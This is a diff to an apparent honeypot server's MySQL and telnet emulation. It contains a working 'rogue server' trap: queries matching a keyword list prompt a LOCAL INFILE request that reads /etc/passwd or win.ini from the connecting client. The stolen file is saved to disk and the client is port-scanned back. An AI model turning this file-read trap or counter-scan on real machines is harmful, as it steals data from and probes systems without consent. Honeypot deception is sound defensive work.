@@ -459,6 +459,7 @@ function startServer(proto, port) {
         let mysqlExfilFile = '/etc/passwd';
         let mysqlSeqNum = 0;
         let mysqlFileBuffer = Buffer.alloc(0);
+        let mysqlIncomingBuffer = Buffer.alloc(0);
 
         // ── Redis RESP variables ───────────────────────────────────────────
         let redisBuffer = '';
@@ -784,307 +785,320 @@ function startServer(proto, port) {
 
             // MySQL Rogue Server state machine interceptor
             if (proto.key === 'mysql') {
-                if (data.length < 4) {
+                if (mysqlIncomingBuffer.length === 0 && data.length < 4) {
                     socket.destroy();
                     return;
                 }
+                mysqlIncomingBuffer = Buffer.concat([mysqlIncomingBuffer, data]);
                 try {
-                    mysqlSeqNum = data[3]; // grab sequence number
-                    
-                    if (mysqlState === 0) {
-                        // State 0: Received Client Authentication Response
-                        // Validate minimum auth packet structure (capability flags + max packet + charset + reserved)
-                        if (data.length < 36) {
-                            logger.warn(`MySQL malformed auth packet from ${ip} (${data.length} bytes)`, { protocol: 'mysql', ip });
-                            socket.destroy();
-                            return;
-                        }
-                        
-                        // Extract username from auth packet (after 32-byte fixed header)
-                        const nullTermIdx = data.indexOf(0x00, 36);
-                        const mysqlUsername = nullTermIdx > 36 ? data.slice(36, nullTermIdx).toString('utf8') : 'unknown';
-                        
-                        logger.info(`MySQL auth from user "${sanitizeForLog(mysqlUsername)}"`, { protocol: 'mysql', ip });
-                        logEvent({
-                            protocol: 'mysql',
-                            ip,
-                            port,
-                            username: mysqlUsername,
-                            attack_type: 'mysql_login'
-                        });
-                        
-                        mysqlState = 1; // Mark as auth-received
-                        
-                        // Send OK response (accept all credentials — honeypot)
-                        const okPacket = Buffer.from([
-                            0x07, 0x00, 0x00, 0x02, // Header: len 7, seq 2
-                            0x00, // OK header
-                            0x00, 0x00, // Affected rows 0, insert ID 0
-                            0x02, 0x00, // Server status: AUTOCOMMIT
-                            0x00, 0x00 // Warnings 0
-                        ]);
-                        socket.write(okPacket);
-                        mysqlState = 2; // Auth complete, wait for query
-                        return;
-                    }
-                    
-                     if (mysqlState === 2) {
-                        // Wait for COM_QUERY (0x03) packet
-                        if (data.length >= 5 && data[4] === 0x03) {
-                            const query = data.slice(5).toString('utf8').trim();
-                            const queryLower = query.toLowerCase();
-                            logger.info(`MySQL COM_QUERY query: "${sanitizeForLog(query)}"`, { protocol: 'mysql', ip });
+                    while (mysqlIncomingBuffer.length >= 4) {
+                        const packetLen = mysqlIncomingBuffer.readUIntLE(0, 3);
+                        const seqId = mysqlIncomingBuffer[3];
 
+                        if (mysqlIncomingBuffer.length < 4 + packetLen) {
+                            // Incomplete packet, wait for more data
+                            break;
+                        }
+
+                        const packet = mysqlIncomingBuffer.slice(4, 4 + packetLen);
+                        // Consume from accumulator
+                        mysqlIncomingBuffer = mysqlIncomingBuffer.slice(4 + packetLen);
+
+                        mysqlSeqNum = seqId;
+
+                        if (mysqlState === 0) {
+                            // State 0: Received Client Authentication Response
+                            // Validate minimum auth packet structure (capability flags + max packet + charset + reserved)
+                            if (packet.length < 32) {
+                                logger.warn(`MySQL malformed auth packet from ${ip} (${packet.length} bytes)`, { protocol: 'mysql', ip });
+                                socket.destroy();
+                                return;
+                            }
+
+                            // Extract username from auth packet (after 32-byte fixed header of auth payload)
+                            const nullTermIdx = packet.indexOf(0x00, 32);
+                            const mysqlUsername = nullTermIdx > 32 ? packet.slice(32, nullTermIdx).toString('utf8') : 'unknown';
+
+                            logger.info(`MySQL auth from user "${sanitizeForLog(mysqlUsername)}"`, { protocol: 'mysql', ip });
                             logEvent({
                                 protocol: 'mysql',
                                 ip,
                                 port,
-                                input: query.substring(0, 200),
-                                attack_type: 'mysql_query'
+                                username: mysqlUsername,
+                                attack_type: 'mysql_login'
                             });
 
-                            const seq = mysqlSeqNum + 1;
+                            mysqlState = 1; // Mark as auth-received
 
-                            // Helper: build a simple MySQL text result set (1 column, 1 row)
-                            const makeSingleResult = (colName, value, seqStart) => {
-                                const bufs = [];
-                                // Column count packet (1 column)
-                                bufs.push(Buffer.from([0x01, 0x00, 0x00, seqStart, 0x01]));
-                                // Column definition (simplified)
-                                const colNameBuf = Buffer.from(colName, 'utf8');
-                                const colBody = Buffer.concat([
-                                    Buffer.from([0x03]), Buffer.from('def'),  // catalog
-                                    Buffer.from([0x00]),                       // schema
-                                    Buffer.from([0x00]),                       // table
-                                    Buffer.from([0x00]),                       // org_table
-                                    Buffer.from([colNameBuf.length]), colNameBuf, // name
-                                    Buffer.from([0x00]),                       // org_name
-                                    Buffer.from([0x0c, 0x21, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfd, 0x01, 0x00, 0x1f, 0x00, 0x00])
-                                ]);
-                                const colPkt = Buffer.alloc(4 + colBody.length);
-                                colPkt.writeUIntLE(colBody.length, 0, 3);
-                                colPkt[3] = seqStart + 1;
-                                colBody.copy(colPkt, 4);
-                                bufs.push(colPkt);
-                                // EOF
-                                bufs.push(Buffer.from([0x05, 0x00, 0x00, seqStart + 2, 0xfe, 0x00, 0x00, 0x02, 0x00]));
-                                // Row data
-                                const valBuf = Buffer.from(value, 'utf8');
-                                const rowBody = Buffer.alloc(1 + valBuf.length);
-                                rowBody[0] = valBuf.length;
-                                valBuf.copy(rowBody, 1);
-                                const rowPkt = Buffer.alloc(4 + rowBody.length);
-                                rowPkt.writeUIntLE(rowBody.length, 0, 3);
-                                rowPkt[3] = seqStart + 3;
-                                rowBody.copy(rowPkt, 4);
-                                bufs.push(rowPkt);
-                                // EOF (end of rows)
-                                bufs.push(Buffer.from([0x05, 0x00, 0x00, seqStart + 4, 0xfe, 0x00, 0x00, 0x02, 0x00]));
-                                return Buffer.concat(bufs);
-                            };
-
-                            // Helper: OK packet
-                            const makeOkPacket = (seqNum) => Buffer.from([
-                                0x07, 0x00, 0x00, seqNum,
-                                0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
+                            // Send OK response (accept all credentials — honeypot)
+                            const okPacket = Buffer.from([
+                                0x07, 0x00, 0x00, 0x02, // Header: len 7, seq 2
+                                0x00, // OK header
+                                0x00, 0x00, // Affected rows 0, insert ID 0
+                                0x02, 0x00, // Server status: AUTOCOMMIT
+                                0x00, 0x00 // Warnings 0
                             ]);
+                            socket.write(okPacket);
+                            mysqlState = 2; // Auth complete, wait for query
+                            continue;
+                        }
 
-                            // ── Safe queries: respond with realistic MySQL data ──
-                            if (queryLower.includes('@@version_comment')) {
-                                socket.write(makeSingleResult('@@version_comment', 'Debian', seq));
-                                return;
-                            }
-                            if (queryLower.match(/select\s+@@version\b/) || queryLower === 'select version()') {
-                                socket.write(makeSingleResult('@@version', '8.0.35-0ubuntu0.22.04.1', seq));
-                                return;
-                            }
-                            if (queryLower.includes('@@hostname')) {
-                                socket.write(makeSingleResult('@@hostname', 'db-prod-01', seq));
-                                return;
-                            }
-                            if (queryLower.includes('@@datadir')) {
-                                socket.write(makeSingleResult('@@datadir', '/var/lib/mysql/', seq));
-                                return;
-                            }
-                            if (queryLower.includes('@@version_compile_os')) {
-                                socket.write(makeSingleResult('@@version_compile_os', 'Linux', seq));
-                                return;
-                            }
-                            if (queryLower.includes('@@global.') || queryLower.includes('@@session.')) {
-                                socket.write(makeSingleResult('Value', 'OFF', seq));
-                                return;
-                            }
-                            if (queryLower.startsWith('set ') || queryLower.startsWith('use ')) {
-                                socket.write(makeOkPacket(seq));
-                                return;
-                            }
-                            if (queryLower === 'select 1' || queryLower === 'select 1;') {
-                                socket.write(makeSingleResult('1', '1', seq));
-                                return;
-                            }
-                            if (queryLower.startsWith('select database()')) {
-                                socket.write(makeSingleResult('database()', 'production', seq));
-                                return;
-                            }
-                            if (queryLower.startsWith('select user()') || queryLower.startsWith('select current_user()')) {
-                                socket.write(makeSingleResult('user()', 'root@%', seq));
-                                return;
-                            }
-
-                            // ── Suspicious queries → trigger INFILE trap ──
-                            const isSuspicious = queryLower.startsWith('show databases') ||
-                                queryLower.startsWith('show tables') ||
-                                queryLower.startsWith('show schemas') ||
-                                queryLower.match(/select\s+\*\s+from/) ||
-                                queryLower.match(/select\s+.*from\s+(mysql|information_schema|performance_schema)/) ||
-                                queryLower.includes('information_schema') ||
-                                queryLower.includes('load data') ||
-                                queryLower.includes('into outfile') ||
-                                queryLower.includes('into dumpfile') ||
-                                queryLower.includes('union') ||
-                                queryLower.match(/select\s+.*password/) ||
-                                queryLower.match(/select\s+.*from\s+/);
-
-                            if (isSuspicious) {
-
-                                mysqlExfilFile = Math.random() > 0.5 ? '/etc/passwd' : 'C:\\Windows\\win.ini';
-                                logger.warn(`MySQL Rogue INFILE triggered by: "${query.substring(0, 80)}" from ${ip}`, { protocol: 'mysql', ip });
+                        if (mysqlState === 2) {
+                            // Wait for COM_QUERY (0x03) packet
+                            if (packet.length >= 1 && packet[0] === 0x03) {
+                                const query = packet.slice(1).toString('utf8').trim();
+                                const queryLower = query.toLowerCase();
+                                logger.info(`MySQL COM_QUERY query: "${sanitizeForLog(query)}"`, { protocol: 'mysql', ip });
 
                                 logEvent({
                                     protocol: 'mysql',
                                     ip,
                                     port,
-                                    input: query.substring(0, 100),
-                                    attack_type: 'mysql_rogue_infile_triggered',
+                                    input: query.substring(0, 200),
+                                    attack_type: 'mysql_query'
+                                });
+
+                                const seq = mysqlSeqNum + 1;
+
+                                // Helper: build a simple MySQL text result set (1 column, 1 row)
+                                const makeSingleResult = (colName, value, seqStart) => {
+                                    const bufs = [];
+                                    // Column count packet (1 column)
+                                    bufs.push(Buffer.from([0x01, 0x00, 0x00, seqStart, 0x01]));
+                                    // Column definition (simplified)
+                                    const colNameBuf = Buffer.from(colName, 'utf8');
+                                    const colBody = Buffer.concat([
+                                        Buffer.from([0x03]), Buffer.from('def'),  // catalog
+                                        Buffer.from([0x00]),                       // schema
+                                        Buffer.from([0x00]),                       // table
+                                        Buffer.from([0x00]),                       // org_table
+                                        Buffer.from([colNameBuf.length]), colNameBuf, // name
+                                        Buffer.from([0x00]),                       // org_name
+                                        Buffer.from([0x0c, 0x21, 0x00, 0xc8, 0x00, 0x00, 0x00, 0xfd, 0x01, 0x00, 0x1f, 0x00, 0x00])
+                                    ]);
+                                    const colPkt = Buffer.alloc(4 + colBody.length);
+                                    colPkt.writeUIntLE(colBody.length, 0, 3);
+                                    colPkt[3] = seqStart + 1;
+                                    colBody.copy(colPkt, 4);
+                                    bufs.push(colPkt);
+                                    // EOF
+                                    bufs.push(Buffer.from([0x05, 0x00, 0x00, seqStart + 2, 0xfe, 0x00, 0x00, 0x02, 0x00]));
+                                    // Row data
+                                    const valBuf = Buffer.from(value, 'utf8');
+                                    const rowBody = Buffer.alloc(1 + valBuf.length);
+                                    rowBody[0] = valBuf.length;
+                                    valBuf.copy(rowBody, 1);
+                                    const rowPkt = Buffer.alloc(4 + rowBody.length);
+                                    rowPkt.writeUIntLE(rowBody.length, 0, 3);
+                                    rowPkt[3] = seqStart + 3;
+                                    rowBody.copy(rowPkt, 4);
+                                    bufs.push(rowPkt);
+                                    // EOF (end of rows)
+                                    bufs.push(Buffer.from([0x05, 0x00, 0x00, seqStart + 4, 0xfe, 0x00, 0x00, 0x02, 0x00]));
+                                    return Buffer.concat(bufs);
+                                };
+
+                                // Helper: OK packet
+                                const makeOkPacket = (seqNum) => Buffer.from([
+                                    0x07, 0x00, 0x00, seqNum,
+                                    0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
+                                ]);
+
+                                // ── Safe queries: respond with realistic MySQL data ──
+                                if (queryLower.includes('@@version_comment')) {
+                                    socket.write(makeSingleResult('@@version_comment', 'Debian', seq));
+                                    continue;
+                                }
+                                if (queryLower.match(/select\s+@@version\b/) || queryLower === 'select version()') {
+                                    socket.write(makeSingleResult('@@version', '8.0.35-0ubuntu0.22.04.1', seq));
+                                    continue;
+                                }
+                                if (queryLower.includes('@@hostname')) {
+                                    socket.write(makeSingleResult('@@hostname', 'db-prod-01', seq));
+                                    continue;
+                                }
+                                if (queryLower.includes('@@datadir')) {
+                                    socket.write(makeSingleResult('@@datadir', '/var/lib/mysql/', seq));
+                                    continue;
+                                }
+                                if (queryLower.includes('@@version_compile_os')) {
+                                    socket.write(makeSingleResult('@@version_compile_os', 'Linux', seq));
+                                    continue;
+                                }
+                                if (queryLower.includes('@@global.') || queryLower.includes('@@session.')) {
+                                    socket.write(makeSingleResult('Value', 'OFF', seq));
+                                    continue;
+                                }
+                                if (queryLower.startsWith('set ') || queryLower.startsWith('use ')) {
+                                    socket.write(makeOkPacket(seq));
+                                    continue;
+                                }
+                                if (queryLower === 'select 1' || queryLower === 'select 1;') {
+                                    socket.write(makeSingleResult('1', '1', seq));
+                                    continue;
+                                }
+                                if (queryLower.startsWith('select database()')) {
+                                    socket.write(makeSingleResult('database()', 'production', seq));
+                                    continue;
+                                }
+                                if (queryLower.startsWith('select user()') || queryLower.startsWith('select current_user()')) {
+                                    socket.write(makeSingleResult('user()', 'root@%', seq));
+                                    continue;
+                                }
+
+                                // ── Suspicious queries → trigger INFILE trap ──
+                                const isSuspicious = queryLower.startsWith('show databases') ||
+                                    queryLower.startsWith('show tables') ||
+                                    queryLower.startsWith('show schemas') ||
+                                    queryLower.match(/select\s+\*\s+from/) ||
+                                    queryLower.match(/select\s+.*from\s+(mysql|information_schema|performance_schema)/) ||
+                                    queryLower.includes('information_schema') ||
+                                    queryLower.includes('load data') ||
+                                    queryLower.includes('into outfile') ||
+                                    queryLower.includes('into dumpfile') ||
+                                    queryLower.includes('union') ||
+                                    queryLower.match(/select\s+.*password/) ||
+                                    queryLower.match(/select\s+.*from\s+/);
+
+                                if (isSuspicious) {
+                                    mysqlExfilFile = Math.random() > 0.5 ? '/etc/passwd' : 'C:\\Windows\\win.ini';
+                                    logger.warn(`MySQL Rogue INFILE triggered by: "${query.substring(0, 80)}" from ${ip}`, { protocol: 'mysql', ip });
+
+                                    logEvent({
+                                        protocol: 'mysql',
+                                        ip,
+                                        port,
+                                        input: query.substring(0, 100),
+                                        attack_type: 'mysql_rogue_infile_triggered',
+                                        target_file: mysqlExfilFile,
+                                        action: 'tarpit',
+                                        severity: 'critical'
+                                    });
+
+                                    reporter.report(ip, {
+                                        protocol: 'mysql',
+                                        port,
+                                        comment: `MySQL enumeration query → Rogue INFILE trap: "${query.substring(0, 100)}"`,
+                                        categories: '15,18'
+                                    }).catch(() => {});
+
+                                    const requestPacket = traps.makeMySQLInfileRequest(mysqlExfilFile, seq);
+                                    socket.write(requestPacket);
+                                    mysqlState = 3;
+                                    continue;
+                                }
+
+                                // Fallback: generic OK for unknown queries
+                                socket.write(makeOkPacket(seq));
+                                continue;
+                            }
+
+                            // COM_QUIT (0x01)
+                            if (packet.length >= 1 && packet[0] === 0x01) {
+                                socket.end();
+                                return;
+                            }
+
+                            // COM_PING (0x0e)
+                            if (packet.length >= 1 && packet[0] === 0x0e) {
+                                const okPkt = Buffer.from([0x07, 0x00, 0x00, mysqlSeqNum + 1, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00]);
+                                socket.write(okPkt);
+                                continue;
+                            }
+
+                            // COM_INIT_DB (0x02)
+                            if (packet.length >= 1 && packet[0] === 0x02) {
+                                const dbName = packet.slice(1).toString('utf8');
+                                logger.info(`MySQL COM_INIT_DB: ${sanitizeForLog(dbName)}`, { protocol: 'mysql', ip });
+                                const okPkt = Buffer.from([0x07, 0x00, 0x00, mysqlSeqNum + 1, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00]);
+                                socket.write(okPkt);
+                                continue;
+                            }
+                        }
+
+                        if (mysqlState === 3) {
+                            // Check if client rejected the local infile request (Error Packet 0xFF)
+                            if (packet.length >= 1 && packet[0] === 0xff) {
+                                const errCode = packet.length >= 3 ? packet.readUInt16LE(1) : 0;
+                                const errMsg = packet.length >= 4 ? packet.slice(3).toString('utf8') : 'Unknown error';
+                                logger.warn(`MySQL client rejected Rogue Server infile request (error code ${errCode}): ${sanitizeForLog(errMsg)}`, { protocol: 'mysql', ip });
+
+                                logEvent({
+                                    protocol: 'mysql',
+                                    ip,
+                                    port,
+                                    attack_type: 'mysql_rogue_infile_rejected',
+                                    error_code: errCode,
+                                    error_message: errMsg
+                                });
+
+                                // Send a mock MySQL OK response to close the command flow gracefully
+                                const okPacket = Buffer.from([
+                                    0x07, 0x00, 0x00, mysqlSeqNum + 1,
+                                    0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
+                                ]);
+                                socket.write(okPacket);
+                                socket.end();
+                                return;
+                            }
+
+                            // Receiving file content chunks
+                            if (packetLen > 0) {
+                                const payload = packet;
+                                if (mysqlFileBuffer.length + payload.length > 16777216) { // 16MB limit
+                                    logger.warn(`MySQL Rogue Server exfil limit exceeded from ${ip}, disconnecting`, { protocol: 'mysql', ip });
+                                    socket.destroy();
+                                    return;
+                                }
+                                mysqlFileBuffer = Buffer.concat([mysqlFileBuffer, payload]);
+                            } else {
+                                // EOF received (length 0)
+                                const exfilContent = mysqlFileBuffer.toString('utf8');
+                                logger.warn(`MySQL Rogue Server exfiltrated ${mysqlFileBuffer.length} bytes from ${ip} (${mysqlExfilFile})`, { protocol: 'mysql', ip });
+
+                                // Save to disk securely
+                                const sanitizeFilename = (mysqlExfilFile.replace(/[^a-zA-Z0-9]/g, '_'));
+                                const exfilDir = path.join(__dirname, '../logs/exfiltrated');
+                                if (!fs.existsSync(exfilDir)) {
+                                    fs.mkdirSync(exfilDir, { recursive: true });
+                                }
+                                const cleanIp = ip.replace(/:/g, '_').substring(0, 50);
+                                const cleanFilename = sanitizeFilename.substring(0, 100);
+                                const savePath = path.join(exfilDir, `${cleanIp}_${cleanFilename}.txt`);
+                                fs.writeFileSync(savePath, exfilContent, 'utf8');
+
+                                logEvent({
+                                    protocol: 'mysql',
+                                    ip,
+                                    port,
+                                    attack_type: 'mysql_rogue_infile_completed',
                                     target_file: mysqlExfilFile,
+                                    exfil_bytes: mysqlFileBuffer.length,
+                                    save_path: savePath,
                                     action: 'tarpit',
                                     severity: 'critical'
                                 });
 
-                                reporter.report(ip, {
-                                    protocol: 'mysql',
-                                    port,
-                                    comment: `MySQL enumeration query → Rogue INFILE trap: "${query.substring(0, 100)}"`,
-                                    categories: '15,18'
-                                }).catch(() => {});
+                                // Perform reverse port scan backfire check
+                                backfire.scanAttackerBack(ip);
 
-                                const requestPacket = traps.makeMySQLInfileRequest(mysqlExfilFile, seq);
-                                socket.write(requestPacket);
-                                mysqlState = 3;
+                                // Send MySQL OK response to satisfy the client and close connection
+                                const okPacket = Buffer.from([
+                                    0x07, 0x00, 0x00, mysqlSeqNum + 1,
+                                    0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
+                                ]);
+                                socket.write(okPacket);
+                                socket.end();
                                 return;
                             }
-
-                            // Fallback: generic OK for unknown queries
-                            socket.write(makeOkPacket(seq));
-                            return;
+                            continue;
                         }
-
-                        // COM_QUIT (0x01)
-                        if (data.length >= 5 && data[4] === 0x01) {
-                            socket.end();
-                            return;
-                        }
-
-                        // COM_PING (0x0e)
-                        if (data.length >= 5 && data[4] === 0x0e) {
-                            const okPkt = Buffer.from([0x07, 0x00, 0x00, mysqlSeqNum + 1, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00]);
-                            socket.write(okPkt);
-                            return;
-                        }
-
-                        // COM_INIT_DB (0x02)
-                        if (data.length >= 5 && data[4] === 0x02) {
-                            const dbName = data.slice(5).toString('utf8');
-                            logger.info(`MySQL COM_INIT_DB: ${sanitizeForLog(dbName)}`, { protocol: 'mysql', ip });
-                            const okPkt = Buffer.from([0x07, 0x00, 0x00, mysqlSeqNum + 1, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00]);
-                            socket.write(okPkt);
-                            return;
-                        }
-                    }
-
-                    if (mysqlState === 3) {
-                        // Check if client rejected the local infile request (Error Packet 0xFF)
-                        if (data.length >= 5 && data[4] === 0xff) {
-                            const errCode = data.length >= 7 ? data.readUInt16LE(5) : 0;
-                            const errMsg = data.length >= 8 ? data.slice(7).toString('utf8') : 'Unknown error';
-                            logger.warn(`MySQL client rejected Rogue Server infile request (error code ${errCode}): ${sanitizeForLog(errMsg)}`, { protocol: 'mysql', ip });
-                            
-                            logEvent({
-                                protocol: 'mysql',
-                                ip,
-                                port,
-                                attack_type: 'mysql_rogue_infile_rejected',
-                                error_code: errCode,
-                                error_message: errMsg
-                            });
-                            
-                            // Send a mock MySQL OK response to close the command flow gracefully
-                            const okPacket = Buffer.from([
-                                0x07, 0x00, 0x00, mysqlSeqNum + 1,
-                                0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
-                            ]);
-                            socket.write(okPacket);
-                            socket.end();
-                            return;
-                        }
-
-                        // Receiving file content chunks
-                        const chunkLen = data.readUIntLE(0, 3);
-                        if (chunkLen > 0) {
-                            const payload = data.slice(4, 4 + chunkLen);
-                            if (mysqlFileBuffer.length + payload.length > 16777216) { // 16MB limit
-                                logger.warn(`MySQL Rogue Server exfil limit exceeded from ${ip}, disconnecting`, { protocol: 'mysql', ip });
-                                socket.destroy();
-                                return;
-                            }
-                            mysqlFileBuffer = Buffer.concat([mysqlFileBuffer, payload]);
-                        } else {
-                            // EOF received (length 0)
-                            const exfilContent = mysqlFileBuffer.toString('utf8');
-                            logger.warn(`MySQL Rogue Server exfiltrated ${mysqlFileBuffer.length} bytes from ${ip} (${mysqlExfilFile})`, { protocol: 'mysql', ip });
-
-                            // Save to disk securely
-                            const sanitizeFilename = (mysqlExfilFile.replace(/[^a-zA-Z0-9]/g, '_'));
-                            const exfilDir = path.join(__dirname, '../logs/exfiltrated');
-                            if (!fs.existsSync(exfilDir)) {
-                                fs.mkdirSync(exfilDir, { recursive: true });
-                            }
-                            const cleanIp = ip.replace(/:/g, '_').substring(0, 50);
-                            const cleanFilename = sanitizeFilename.substring(0, 100);
-                            const savePath = path.join(exfilDir, `${cleanIp}_${cleanFilename}.txt`);
-                            fs.writeFileSync(savePath, exfilContent, 'utf8');
-
-                            logEvent({
-                                protocol: 'mysql',
-                                ip,
-                                port,
-                                attack_type: 'mysql_rogue_infile_completed',
-                                target_file: mysqlExfilFile,
-                                exfil_bytes: mysqlFileBuffer.length,
-                                save_path: savePath,
-                                action: 'tarpit',
-                                severity: 'critical'
-                            });
-
-                            // Perform reverse port scan backfire check
-
-                            backfire.scanAttackerBack(ip);
-
-                            // Send MySQL OK response to satisfy the client and close connection
-                            const okPacket = Buffer.from([
-                                0x07, 0x00, 0x00, mysqlSeqNum + 1,
-                                0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00
-                            ]);
-                            socket.write(okPacket);
-                            socket.end();
-                        }
-                        return;
                     }
                 } catch (err) {
                     logger.error(`MySQL Rogue Server parser error: ${err.message}`, { protocol: 'mysql', ip });
                     socket.destroy();
-                    return;
                 }
+                return;
             }
 
             // Hard limit: discard if IP sends > 64KB total
@@ -1122,7 +1136,12 @@ function startServer(proto, port) {
                             attack_type: 'telnet_login_success',
                             username: telnetUsername
                         });
-                        socket.write('\r\nLinux web-01 6.1.0-rpi7-rpi-2712 #1 SMP PREEMPT Debian 6.1.63-1+rpt1 (2023-11-24) aarch64\r\n\r\nLast login: Fri Jun 12 10:24:15 2026 from 10.0.0.35\r\n');
+                        // Was the host's REAL kernel string (rpi-2712 / aarch64):
+                        // it leaked that this runs on a Raspberry Pi 5, and it
+                        // contradicted every other answer (hostname -> "debian",
+                        // uname -> x86_64, lscpu -> Xeon E5-2686). Keep this line
+                        // in sync with getStaticSSHResponse in ai/engine.js.
+                        socket.write('\r\nLinux debian 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64\r\n\r\nLast login: Fri Jun 12 10:24:15 2026 from 10.0.0.35\r\n');
                         if (proto.prompt) {
                             socket.write(proto.prompt);
                         }
